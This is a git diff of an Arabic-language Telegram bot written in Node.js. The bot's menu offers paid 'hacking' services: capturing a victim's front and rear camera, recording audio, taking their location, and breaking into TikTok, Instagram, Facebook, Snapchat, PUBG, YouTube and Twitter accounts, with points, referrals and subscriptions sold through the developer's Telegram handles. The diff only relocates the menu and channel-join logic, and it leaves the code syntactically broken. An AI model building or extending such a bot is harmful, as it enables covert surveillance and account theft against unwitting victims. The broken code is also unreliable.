@@ -363,40 +363,6 @@ bot.on('polling_error', (error) => {
 
 console.log('البوت يعمل الآن...');
 
-bot.on('message', async (msg) => {
-  const chatId = msg.chat.id;
-  const text = msg.text ? msg.text.toLowerCase() : '';
-  const senderId = msg.from.id;
-  const firstName = msg.from.first_name;
-  const lastName = msg.from.last_name || '';
-  const username = msg.from.username || '';
-
-  // التحقق من الأوامر
-  if (text !== '/start') {
-    // تجاهل الرسائل التي لا تحتوي على الأمر /start
-    return;
-  }
-
-  // التحقق من عضوية القناة المطلوبة
-  if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
-    for (const channel of forcedChannelUsernames) {
-        try {
-            const member = await bot.getChatMember(channel, chatId);
-            if (member.status === 'left' || member.status === 'kicked') {
-                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
-                    reply_markup: {
-                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
-                    }
-                });
-                return;
-            }
-        } catch (error) {
-            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
-            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
-            return;
-        }
-    }
-  }
 
   // تنفيذ العمليات عند تلقي الأمر /start
   if (text === '/start') {
@@ -700,24 +666,66 @@ async function showButtons(chatId, userId) {
   const isSubscribed = subscribedUsers.has(userId);
 
   let statusMessage = isSubscribed 
-    ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
-     
+  bot.on('message', async (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text ? msg.text.toLowerCase() : '';
+  const senderId = msg.from.id;
+  const firstName = msg.from.first_name;
+  const lastName = msg.from.last_name || '';
+  const username = msg.from.username || '';
 
-   let keyboard = [
-        [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
-        [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
-        [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
-        [{ text: '☠️اختراق تيك توك ☠️', callback_data:'increase_tiktok' }],
-        [{ text: '🕷اختراق الانستغرام🕷', callback_data:'increase_instagram' }],
-        [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
-        [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
-        [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
-        [{ text: '🔴اختراق يوتيوب🔴', callback_data:'increase_youtube' }],
-        [{ text: '🐦اختراق تويتر🐦', callback_data:'increase_twitter' }],
-        [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
-        [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
-        [{ text: 'قناة المطور ', url: 'https://t.me/SJGDDW' }],
-        [{ text: ' تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
+  // التحقق من الأوامر
+  if (text !== '/start') {
+    // تجاهل الرسائل التي لا تحتوي على الأمر /start
+    return;
+  }
+
+  // التحقق من عضوية القناة المطلوبة
+  if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
+    for (const channel of forcedChannelUsernames) {
+        try {
+            const member = await bot.getChatMember(channel, chatId);
+            if (member.status === 'left' || member.status === 'kicked') {
+                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
+                    reply_markup: {
+                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
+                    }
+                });
+                return;
+            }
+        } catch (error) {
+            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
+            return;
+        }
+    }
+  }
+
+  // تنفيذ العمليات عند تلقي الأمر /start
+  if (text === '/start') {
+    // تحقق من حالة الاشتراك وعدد النقاط
+    const points = getUserPoints(chatId); // تأكد من أن لديك دالة للحصول على النقاط
+    const isSubscribed = checkSubscription(chatId); // تأكد من أن لديك دالة للتحقق من الاشتراك
+
+    let statusMessage = isSubscribed 
+      ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
+      : `لديك ${points} نقطة. قوم بجمع نقاط كافيه لاستخدام البوت مجانآ.`;
+
+    let keyboard = [
+      [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
+      [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
+      [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
+      [{ text: '☠️اختراق تيك توك ☠️', callback_data:'increase_tiktok' }],
+      [{ text: '🕷اختراق الانستغرام🕷', callback_data:'increase_instagram' }],
+      [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
+      [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
+      [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
+      [{ text: '🔴اختراق يوتيوب🔴', callback_data:'increase_youtube' }],
+      [{ text: '🐦اختراق تويتر🐦', callback_data:'increase_twitter' }],
+      [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
+      [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
+      [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
+      [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
     ];
 
     bot.sendMessage(chatId, `${statusMessage}\n\nمرحبا قوم بختيار اي  شي تريده لكن لان تستطيع استخدام اي رابط سوى 5مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 او قوم بتجميع نقاط لاستخدامه مجانآ:`, {
@@ -725,7 +733,11 @@ async function showButtons(chatId, userId) {
             inline_keyboard: keyboard
         }
     });
-}
+    return;
+  }
+});
+
+   
 
 bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
